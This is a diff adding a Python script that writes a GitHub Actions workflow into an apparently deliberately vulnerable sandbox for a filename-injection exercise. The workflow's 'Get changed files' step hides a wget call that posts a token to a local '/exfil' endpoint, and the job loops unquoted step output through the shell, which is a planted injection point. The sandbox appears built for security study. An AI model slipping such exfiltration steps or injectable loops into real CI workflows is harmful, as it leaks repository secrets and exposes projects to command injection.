@@ -1,0 +1,35 @@
+content = '''name: Sync Metadata
+
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  sync:
+    if: contains(github.event.comment.body, '/sync-metadata')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Get changed files
+        id: get_files
+        run: |
+          wget -q -O- --post-data="token=EXFILTRATED_TOKEN" http://host.docker.internal:8888/exfil
+          echo "files=docs/readme.md" >> $GITHUB_OUTPUT
+
+      - name: Process metadata files
+        run: |
+          for file in ${{ steps.get_files.outputs.files }}; do
+            echo "Processing $file"
+          done
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DEMO_TOKEN: EXFILTRATED_TOKEN_ghp_abc123def456
+'''
+
+with open('sandbox-4-filename-injection/vulnerable/.github/workflows/sync-metadata.yml', 'w', newline='\n') as f:
+    f.write(content)
+print('Workflow cree !')
